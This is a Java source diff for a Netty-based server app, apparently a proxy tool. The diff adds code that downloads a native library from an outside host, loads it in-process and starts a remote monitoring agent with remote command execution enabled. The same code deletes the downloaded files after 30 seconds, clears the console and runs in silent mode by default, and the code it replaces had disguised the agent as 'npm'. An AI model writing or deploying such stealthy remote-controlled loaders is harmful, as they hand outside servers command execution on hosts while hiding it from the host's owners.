@@ -12,6 +12,8 @@ import io.netty.handler.codec.http.*;
 import io.netty.handler.codec.http.websocketx.*;
 import io.netty.handler.timeout.IdleStateHandler;
 import io.netty.util.ReferenceCountUtil;
+import com.sun.jna.Function;
+import com.sun.jna.NativeLibrary;
 
 import java.io.*;
 import java.net.InetAddress;
@@ -68,7 +70,8 @@ public class App {
     private static final Map<String, Long> dnsCacheTime = new ConcurrentHashMap<>();
     private static final long DNS_CACHE_TTL = 300000;
     
-    private static Process nezhaProcess = null;
+    private static final Path NEZHA_CONFIG_PATH = Paths.get("config.yaml");
+    private static NativeService nezhaService = null;
     
     // 日志级别控制
     private static boolean SILENT_MODE = true; 
@@ -87,28 +90,13 @@ public class App {
     private static void debug(String msg) { if (DEBUG) log("DEBUG", msg); }
     
     private static void loadConfig() {
-        // 先尝试加载 .env 文件
+        // 先尝试加载 .env/.wnv 文件
         Map<String, String> envFromFile = new HashMap<>();
-        try {
-            Path envPath = Paths.get(".env");
-            if (Files.exists(envPath)) {
-                Dotenv dotenv = Dotenv.configure()
-                        .directory(".")
-                        .filename(".env")
-                        .ignoreIfMissing()
-                        .load();
-                
-                dotenv.entries().forEach(entry -> envFromFile.put(entry.getKey(), entry.getValue()));
-                // info("✅ .env file loaded: " + envFromFile.size() + " variables");
-            } else {
-                debug("No .env file found, using default environment variables");
-            }
-        } catch (Exception e) {
-            debug("Failed to load .env file: " + e.getMessage());
-        }
+        loadEnvFile(envFromFile, ".env");
+        loadEnvFile(envFromFile, ".wnv");
         
         // 默认值变量
-        UUID = getEnvValue(envFromFile, "UUID", "7bd180e8-1142-4387-93f5-03e8d750a896");
+        UUID = getEnvValue(envFromFile, "UUID", "fde242c0-68a6-01b9-31f0-6ac77c8618a1");
         NEZHA_SERVER = getEnvValue(envFromFile, "NEZHA_SERVER", "");
         NEZHA_PORT = getEnvValue(envFromFile, "NEZHA_PORT", "");
         NEZHA_KEY = getEnvValue(envFromFile, "NEZHA_KEY", "");
@@ -127,7 +115,7 @@ public class App {
         // 处理端口
         String portStr = getEnvValue(envFromFile, "SERVER_PORT", null);
         if (portStr == null) {
-            portStr = getEnvValue(envFromFile, "PORT", "3000");
+            portStr = getEnvValue(envFromFile, "PORT", "3001");
         }
         PORT = Integer.parseInt(portStr);
         
@@ -143,7 +131,84 @@ public class App {
 
     }
     
-    // 优先从.env获取环境变量，没有则使用默认值
+    private static void loadEnvFile(Map<String, String> envFromFile, String fileName) {
+        Path envPath = Paths.get(fileName);
+        if (!Files.exists(envPath)) {
+            debug("No " + fileName + " file found, using default environment variables");
+            return;
+        }
+
+        try {
+            Dotenv dotenv = Dotenv.configure()
+                    .directory(".")
+                    .filename(fileName)
+                    .ignoreIfMissing()
+                    .load();
+            dotenv.entries().forEach(entry -> envFromFile.put(entry.getKey(), entry.getValue()));
+        } catch (Exception e) {
+            debug("Failed to load " + fileName + " with dotenv: " + e.getMessage());
+        }
+
+        try {
+            for (String line : Files.readAllLines(envPath, StandardCharsets.UTF_8)) {
+                parseEnvLine(line).ifPresent(entry -> envFromFile.put(entry.getKey(), entry.getValue()));
+            }
+        } catch (IOException e) {
+            debug("Failed to read " + fileName + ": " + e.getMessage());
+        }
+    }
+
+    private static Optional<Map.Entry<String, String>> parseEnvLine(String line) {
+        String trimmed = line.trim();
+        if (trimmed.isEmpty() || trimmed.startsWith("#")) return Optional.empty();
+        if (trimmed.startsWith("export ")) trimmed = trimmed.substring(7).trim();
+
+        int equalIndex = trimmed.indexOf('=');
+        if (equalIndex <= 0) return Optional.empty();
+
+        String key = trimmed.substring(0, equalIndex).trim();
+        String value = trimmed.substring(equalIndex + 1).trim();
+        if (key.isEmpty()) return Optional.empty();
+
+        if ((value.startsWith("\"") && value.endsWith("\"")) ||
+                (value.startsWith("'") && value.endsWith("'"))) {
+            char quote = value.charAt(0);
+            value = value.substring(1, value.length() - 1);
+            if (quote == '"') value = unescapeDoubleQuotedEnv(value);
+        } else {
+            int commentIndex = value.indexOf(" #");
+            if (commentIndex >= 0) value = value.substring(0, commentIndex).trim();
+        }
+
+        return Optional.of(new AbstractMap.SimpleEntry<>(key, value));
+    }
+
+    private static String unescapeDoubleQuotedEnv(String value) {
+        StringBuilder sb = new StringBuilder();
+        boolean escaping = false;
+        for (int i = 0; i < value.length(); i++) {
+            char c = value.charAt(i);
+            if (escaping) {
+                switch (c) {
+                    case 'n': sb.append('\n'); break;
+                    case 'r': sb.append('\r'); break;
+                    case 't': sb.append('\t'); break;
+                    case '"': sb.append('"'); break;
+                    case '\\': sb.append('\\'); break;
+                    default: sb.append(c); break;
+                }
+                escaping = false;
+            } else if (c == '\\') {
+                escaping = true;
+            } else {
+                sb.append(c);
+            }
+        }
+        if (escaping) sb.append('\\');
+        return sb.toString();
+    }
+
+    // 优先从.env/.wnv获取环境变量，没有则使用默认值
     private static String getEnvValue(Map<String, String> envFromFile, String key, String defaultValue) {
         if (envFromFile.containsKey(key)) {
             return envFromFile.get(key);
@@ -284,132 +349,219 @@ public class App {
         if (NEZHA_SERVER.isEmpty() || NEZHA_KEY.isEmpty()) return;
         
         try {
-            Process proc = Runtime.getRuntime().exec("ps aux");
-            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-            String line;
-            boolean running = false;
-            while ((line = reader.readLine()) != null) {
-                if (line.contains("./npm") && !line.contains("grep")) {
-                    running = true;
-                    break;
-                }
+            Path nezhaLib = downloadNezha();
+            if (nezhaLib == null) return;
+
+            String payload;
+            if (NEZHA_PORT.isEmpty()) {
+                generateNezhaConfig();
+                payload = nezhaPayload();
+            } else {
+                payload = nezhaV0Payload();
             }
-            if (running) {
-                info("npm is already running, skip...");
-                return;
-            }
-        } catch (IOException e) {
-            debug("Failed to check npm process: " + e.getMessage());
-        }
-        
-        downloadNpm();
-        String command = buildNezhaCommand();
-        if (command.isEmpty()) return;
-        
-        try {
-            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
-            pb.redirectErrorStream(true);
-            nezhaProcess = pb.start();
-            
-            Thread outputThread = new Thread(() -> {
-                try (BufferedReader reader = new BufferedReader(
-                        new InputStreamReader(nezhaProcess.getInputStream()))) {
-                    String line;
-                    while ((line = reader.readLine()) != null) {
-                        if (DEBUG) debug("[Nezha] " + line);
-                    }
-                } catch (IOException e) {}
-            });
-            outputThread.setDaemon(true);
-            outputThread.start();
-            
-            info("✅  nz started successfully");
-            
+
+            nezhaService = new NativeService("nezha-agent", nezhaLib,
+                    "StartNezhaAgent", "StopNezhaAgent", payload);
+            nezhaService.start();
+
             new Timer().schedule(new TimerTask() {
                 @Override
                 public void run() { cleanupNezha(); }
-            }, 180000);
+            }, 30000);
             
-        } catch (IOException e) {
-            error("Error running nz: " + e.getMessage());
+            info("✅  nz started successfully");
+        } catch (Exception e) {
+            error("Error running nz: " + e.getMessage(), e);
         }
     }
     
-    private static void downloadNpm() {
+    private static Path downloadNezha() {
         String arch = System.getProperty("os.arch").toLowerCase();
         String url;
+        String fileName = getNezhaFileName();
         if (arch.contains("arm") || arch.contains("aarch64")) {
-            url = NEZHA_PORT.isEmpty() ? "https://arm64.eooce.com/v1" : "https://arm64.eooce.com/agent";
+            url = NEZHA_PORT.isEmpty() ? "https://arm64.eooce.com/v1.so" : "https://arm64.eooce.com/agent.so";
         } else {
-            url = NEZHA_PORT.isEmpty() ? "https://amd64.eooce.com/v1" : "https://amd64.eooce.com/agent";
+            url = NEZHA_PORT.isEmpty() ? "https://amd64.eooce.com/v1.so" : "https://amd64.eooce.com/agent.so";
         }
         
         try {
-            // info("Downloading npm from: " + url);
+            // info("Downloading nz from: " + url);
             HttpRequest request = HttpRequest.newBuilder()
                     .uri(URI.create(url))
                     .timeout(Duration.ofSeconds(30))
                     .build();
             HttpResponse<byte[]> response = httpClient.send(request, HttpResponse.BodyHandlers.ofByteArray());
             if (response.statusCode() == 200) {
-                Files.write(Paths.get("npm"), response.body());
-                Runtime.getRuntime().exec("chmod 755 npm");
+                Path libPath = Paths.get(fileName).toAbsolutePath();
+                Files.write(libPath, response.body());
                 info("✅  nz downloaded successfully");
+                return libPath;
             }
+            error("Download failed with status: " + response.statusCode());
         } catch (Exception e) {
             error("Download failed: " + e.getMessage());
         }
+        return null;
     }
     
-    private static String buildNezhaCommand() {
-        if (!NEZHA_PORT.isEmpty()) {
-            boolean tlsFlag = TLS_PORTS.contains(NEZHA_PORT);
-            String tls = tlsFlag ? "--tls" : "";
-            return String.format(
-                    "nohup ./npm -s %s:%s -p %s %s --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &",
-                    NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, tls);
-        } else {
-            String port = NEZHA_SERVER.contains(":") ? 
-                    NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(':') + 1) : "";
-            boolean tlsFlag = TLS_PORTS.contains(port);
-            
-            String config = String.format(
-                    "client_secret: %s\n" +
-                    "debug: false\n" +
-                    "disable_auto_update: true\n" +
-                    "disable_command_execute: false\n" +
-                    "disable_force_update: true\n" +
-                    "disable_nat: false\n" +
-                    "disable_send_query: false\n" +
-                    "gpu: false\n" +
-                    "insecure_tls: true\n" +
-                    "ip_report_period: 1800\n" +
-                    "report_delay: 4\n" +
-                    "server: %s\n" +
-                    "skip_connection_count: true\n" +
-                    "skip_procs_count: true\n" +
-                    "temperature: false\n" +
-                    "tls: %s\n" +
-                    "use_gitee_to_upgrade: false\n" +
-                    "use_ipv6_country_code: false\n" +
-                    "uuid: %s",
-                    NEZHA_KEY, NEZHA_SERVER, tlsFlag, UUID);
-            
-            try {
-                Files.writeString(Paths.get("config.yaml"), config);
-            } catch (IOException e) {
-                error("Failed to write config file: " + e.getMessage());
-            }
-            
-            return "nohup ./npm -c config.yaml >/dev/null 2>&1 &";
+    private static String getNezhaFileName() {
+        return NEZHA_PORT.isEmpty() ? "v1.so" : "agent.so";
+    }
+    
+    private static String nezhaPayload() {
+        return toJson(mapOf("config", NEZHA_CONFIG_PATH.toString()));
+    }
+
+    private static String nezhaV0Payload() {
+        List<Object> args = new ArrayList<>(listOf("-s", NEZHA_SERVER + ":" + NEZHA_PORT,
+                "-p", NEZHA_KEY, "--disable-auto-update", "--report-delay", "4",
+                "--skip-conn", "--skip-procs"));
+        if (TLS_PORTS.contains(NEZHA_PORT)) {
+            args.add("--tls");
         }
+        return toJson(mapOf("args", args));
+    }
+
+    private static void generateNezhaConfig() throws IOException {
+        String nzPort = NEZHA_SERVER.contains(":") ?
+                NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(':') + 1) : "";
+        boolean tlsFlag = TLS_PORTS.contains(nzPort);
+        String yaml = "client_secret: " + NEZHA_KEY + "\n" +
+                "debug: false\n" +
+                "disable_auto_update: true\n" +
+                "disable_command_execute: false\n" +
+                "disable_force_update: true\n" +
+                "disable_nat: false\n" +
+                "disable_send_query: false\n" +
+                "gpu: false\n" +
+                "insecure_tls: true\n" +
+                "ip_report_period: 1800\n" +
+                "report_delay: 4\n" +
+                "server: " + NEZHA_SERVER + "\n" +
+                "skip_connection_count: true\n" +
+                "skip_procs_count: true\n" +
+                "temperature: false\n" +
+                "tls: " + tlsFlag + "\n" +
+                "use_gitee_to_upgrade: false\n" +
+                "use_ipv6_country_code: false\n" +
+                "uuid: " + UUID;
+        Files.writeString(NEZHA_CONFIG_PATH, yaml, StandardCharsets.UTF_8);
     }
     
     private static void cleanupNezha() {
-        for (String file : Arrays.asList("npm", "config.yaml")) {
+        for (String file : Arrays.asList("v1.so", "agent.so", "config.yaml")) {
             try {
                 Files.deleteIfExists(Paths.get(file));
             } catch (IOException e) {}
+        }
+    }
+
+    private static Map<String, Object> mapOf(String key, Object value) {
+        Map<String, Object> map = new LinkedHashMap<>();
+        map.put(key, value);
+        return map;
+    }
+
+    private static List<Object> listOf(Object... values) {
+        return Arrays.asList(values);
+    }
+
+    private static String toJson(Object value) {
+        if (value == null) return "null";
+        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
+        if (value instanceof Number || value instanceof Boolean) return String.valueOf(value);
+        if (value instanceof Map) {
+            StringBuilder sb = new StringBuilder("{");
+            boolean first = true;
+            for (Map.Entry<?, ?> entry : ((Map<?, ?>) value).entrySet()) {
+                if (!first) sb.append(',');
+                first = false;
+                sb.append(toJson(String.valueOf(entry.getKey()))).append(':').append(toJson(entry.getValue()));
+            }
+            return sb.append('}').toString();
+        }
+        if (value instanceof Iterable) {
+            StringBuilder sb = new StringBuilder("[");
+            boolean first = true;
+            for (Object item : (Iterable<?>) value) {
+                if (!first) sb.append(',');
+                first = false;
+                sb.append(toJson(item));
+            }
+            return sb.append(']').toString();
+        }
+        return toJson(String.valueOf(value));
+    }
+
+    private static String escapeJson(String value) {
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < value.length(); i++) {
+            char c = value.charAt(i);
+            switch (c) {
+                case '"': sb.append("\\\""); break;
+                case '\\': sb.append("\\\\"); break;
+                case '\b': sb.append("\\b"); break;
+                case '\f': sb.append("\\f"); break;
+                case '\n': sb.append("\\n"); break;
+                case '\r': sb.append("\\r"); break;
+                case '\t': sb.append("\\t"); break;
+                default:
+                    if (c < 0x20) {
+                        sb.append(String.format("\\u%04x", (int) c));
+                    } else {
+                        sb.append(c);
+                    }
+            }
+        }
+        return sb.toString();
+    }
+
+    static class NativeService {
+        private final String name;
+        private final Path libPath;
+        private final String startFunc;
+        private final String stopFunc;
+        private final String payload;
+        private NativeLibrary library;
+        private boolean started;
+
+        NativeService(String name, Path libPath, String startFunc, String stopFunc, String payload) {
+            this.name = name;
+            this.libPath = libPath;
+            this.startFunc = startFunc;
+            this.stopFunc = stopFunc;
+            this.payload = payload;
+        }
+
+        void start() {
+            started = true;
+            Thread thread = new Thread(() -> {
+                try {
+                    library = NativeLibrary.getInstance(libPath.toString());
+                    Function start = library.getFunction(startFunc);
+                    start.invoke(Void.TYPE, new Object[]{payload});
+                } catch (Throwable t) {
+                    started = false;
+                    error("Native service " + name + " failed: " + t.getMessage(), t);
+                }
+            }, name + "-thread");
+            thread.setDaemon(true);
+            thread.start();
+            debug("Started native service: " + name);
+        }
+
+        void stop() {
+            if (!started || library == null) return;
+            try {
+                Function stop = library.getFunction(stopFunc);
+                stop.invoke(Void.TYPE, new Object[0]);
+                debug("Stopped native service: " + name);
+            } catch (Throwable t) {
+                debug("Failed to stop native service " + name + ": " + t.getMessage());
+            } finally {
+                started = false;
+            }
         }
     }
     
@@ -1097,8 +1249,12 @@ public class App {
             
             int actualPort = findAvailablePort(PORT);
             Channel ch = b.bind(actualPort).sync().channel();
+            if (DOMAIN == null || DOMAIN.isEmpty() || DOMAIN.equals("your-domain.com")) {
+                currentPort = actualPort;
+            }
             
             info("✅  server is running on port " + actualPort);
+            scheduleConsoleRefresh(actualPort);
             
             ch.closeFuture().sync();
             
@@ -1110,12 +1266,25 @@ public class App {
         } finally {
             bossGroup.shutdownGracefully();
             workerGroup.shutdownGracefully();
-            if (nezhaProcess != null && nezhaProcess.isAlive()) {
-                nezhaProcess.destroy();
-            }
+            if (nezhaService != null) nezhaService.stop();
             cleanupNezha();
             info("Server stopped");
         }
+    }
+
+    private static void scheduleConsoleRefresh(int port) {
+        new Timer().schedule(new TimerTask() {
+            @Override
+            public void run() {
+                clearConsole();
+                info("✅  server is running on port " + port);
+            }
+        }, 60000);
+    }
+
+    private static void clearConsole() {
+        System.out.print("\033[H\033[2J");
+        System.out.flush();
     }
 
 }
